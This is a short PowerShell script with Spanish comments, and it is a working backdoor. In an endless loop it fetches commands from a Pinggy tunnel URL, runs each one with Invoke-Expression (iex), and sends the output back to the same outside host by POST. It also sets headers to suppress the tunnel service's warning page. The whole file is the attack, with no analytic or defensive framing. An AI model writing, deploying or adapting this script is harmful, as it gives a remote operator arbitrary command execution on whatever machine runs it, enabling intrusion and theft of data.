# URL de tu túnel Pinggy
$u = 'https://cmzaw-84-126-116-174.run.pinggy-free.link'

# Headers para evitar la advertencia de Pinggy y que funcione como API
$headers = @{
    "X-Pinggy-No-Screen" = "true"
    "User-Agent" = "PinggyAPIClient/1.0"
}

while($true) {
    try {
        # Obtener comando (GET)
        $c = (Invoke-WebRequest -Uri $u -Headers $headers -UseBasicParsing).Content
        
        if ($c -and $c -ne 'OK') {
            # Ejecutar comando y enviar resultado (POST)
            $r = iex $c 2>&1 | Out-String
            Invoke-WebRequest -Uri $u -Method POST -Body $r -Headers $headers -UseBasicParsing
        }
    } catch {
        # Si hay error, esperamos un poco para no saturar
    }
    Start-Sleep -Seconds 3
}
